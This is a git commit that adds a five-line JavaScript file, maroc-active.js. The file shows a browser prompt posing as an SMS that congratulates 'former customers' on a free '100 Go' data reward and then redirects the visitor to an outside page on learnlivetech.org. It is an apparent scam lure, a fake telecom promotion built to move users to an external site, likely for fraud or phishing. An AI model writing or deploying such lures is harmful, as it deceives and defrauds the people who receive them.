d78557eb143a4ad62bb243c57f87e79acef759ef
bigukpe <bigaka42@gmail.com>
2025-03-23 23:15:58 +0100

    Create maroc-active.js

---
+++ maroc-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 100 Go '
+password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir une récompense spéciale de 100 Go pour les anciens clients, cliquez sur OK pour activer 100 Go. ','ACTIVER 100 Go ');
+if (password != 'ACTIVER 100 Go ') {
+location.href='https://learnlivetech.org/maroc.html';
+}
